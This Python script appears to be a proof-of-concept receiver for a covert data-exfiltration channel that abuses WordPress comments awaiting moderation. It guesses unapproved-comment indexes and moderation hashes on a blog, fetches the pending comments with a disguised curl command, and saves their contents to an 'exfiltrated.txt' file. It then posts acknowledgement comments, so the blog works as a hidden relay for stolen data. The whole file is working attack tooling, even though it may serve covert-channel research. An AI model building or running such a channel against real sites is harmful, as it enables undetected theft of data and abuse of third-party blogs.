#!/usr/bin/env python3

from wpc2 import *
from bs4 import BeautifulSoup
import urllib.parse
import sys
import datetime

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.exfil_channel_id = 5
channel.ack_channel = "2021/08/13/ack-channel/"
channel.ack_channel_id = 7

recv_time_slot = 10
process_time_slot = 20

prev_unapproved_index = 0

class Client:
    id = ""
    time_slot = ""

def fetch_comments_page(comments_url):
    fetch_comments_command = """
    curl '""" \
    + comments_url + \
    """' \
      -H 'Connection: keep-alive' \
      -H 'Cache-Control: max-age=0' \
      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
      -H 'sec-ch-ua-mobile: ?1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
      -H 'Sec-Fetch-Site: none' \
      -H 'Sec-Fetch-Mode: navigate' \
      -H 'Sec-Fetch-User: ?1' \
      -H 'Sec-Fetch-Dest: document' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      --compressed -s
    """
    curl_output = subprocess.check_output(fetch_comments_command, shell=True)
    return curl_output.decode()

clients = []
for i in range(1, 4):
    client = Client()
    client.id = str(i)
    clients.append(client)
    print("## Created client with id: " + str(client.id))

if prev_unapproved_index == 0:
    prev_unapproved_index = get_current_unapproved_index(channel)

def receive_data(channel, num_of_receivers, recv_time_slot, process_time_slot):
    global prev_unapproved_index

    received_data = []
    
    print("[INFO] Delaying to client timeslot. " + str(recv_time_slot))
    delay_to_timeslot(recv_time_slot)
    current_hash, server_index = get_moderation_hash_at_current_time(channel)

    print("[INFO] Current hash is: " + current_hash)
    print("[INFO] Delaying to server timeslot. " + str(process_time_slot))

    delay_to_timeslot(process_time_slot)

    index_client = 0
    processed_unapproved_indexes = []
            
    while index_client < num_of_receivers:
        print("## checking index_client: " + str(index_client))
        
        for index_offset in range(1, num_of_receivers + 1 + 1):
            print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", index_offset: " + str(index_offset))
            current_unapproved_index = prev_unapproved_index + index_offset
            print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
            if current_unapproved_index == server_index:
                index_client += 1
                continue
            if current_unapproved_index in processed_unapproved_indexes:
                continue
            
            url = channel.target_blog + channel.exfil_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
            print("[INFO] Checking URL: " + url);

            response_html = fetch_comments_page(url)
            soup = BeautifulSoup(response_html, "html.parser")

            if soup.find("p", class_="comment-awaiting-moderation"):
                elems = soup.find_all("div", class_="comment-content")
                elem = elems[-1]
                if elem and elem.string:
                    exfil_content = str(elem.string).strip()
                    received_data.append(exfil_content)

                    processed_unapproved_indexes.append(current_unapproved_index)
                    print("## processed_unapproved_indexes: " + str(processed_unapproved_indexes))
                    
                    break
            else:
                print("[INFO] No comment for moderation for " + str(recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
            index_client += 1

    prev_unapproved_index = get_current_unapproved_index(channel)

    return received_data
    
loop_counter = 99
while(loop_counter > 0):
    received_data = receive_data(channel, len(clients), recv_time_slot, process_time_slot)
    for exfil_content in received_data:
        to_write = str(datetime.datetime.utcnow()) + ": "
        to_write += "Extracted data with timeslot of " + str(recv_time_slot) + ": " + exfil_content + "\n"
        print("[INFO] " + to_write);
        f = open("../output/exfiltrated.txt", "a")
        f.write(to_write)
        f.close()
        
        message_id = exfil_content.split(":")[0]
        print("[INFO] Extracted message_id is " + message_id)
        submit_comment(channel.target_blog, channel.ack_channel_id, message_id)

    loop_counter -= 1
